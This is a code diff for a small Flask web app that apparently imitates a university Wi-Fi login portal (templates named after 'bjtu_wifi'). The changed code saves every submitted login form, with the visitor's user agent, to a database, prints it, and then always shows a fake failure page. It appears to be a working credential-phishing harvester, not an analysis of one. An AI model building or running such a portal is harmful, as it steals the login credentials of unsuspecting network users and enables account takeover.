@@ -1,6 +1,6 @@
 # !/usr/bin/env python
 #  -*- coding: utf-8 -*-
-from flask import Flask, render_template, request, redirect
+from flask import Flask, render_template, request, redirect, url_for
 from flask_sqlalchemy import SQLAlchemy
 import datetime
 
@@ -26,14 +26,14 @@ class Wifi(db.Model):
     create_time = db.Column(db.DateTime())
 
     def __repr__(self):
-        return "<PostData '%s'>" % self.title
+        return "<PostData '%s'>" % self.id
 
 
-@app.route('/', methods=['GET', 'POST'])
 @app.route('/login.html', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
         post_data = request.form.to_dict()
+        print post_data
         if check_data(post_data):
             data = Wifi()
             data.remote_user = request.user_agent.string
@@ -43,9 +43,8 @@ def login():
             data.create_time = datetime.datetime.now()
             db.session.add(data)
             db.session.commit()
-            # return render_template('bjtu_wifi_old_fail.html')
-
-    # return render_template('bjtu_wifi_new_pc.htm')
+            print data
+        return render_template('bjtu_wifi_old_fail.html')
     return render_template('bjtu_wifi_old.html')
 
 
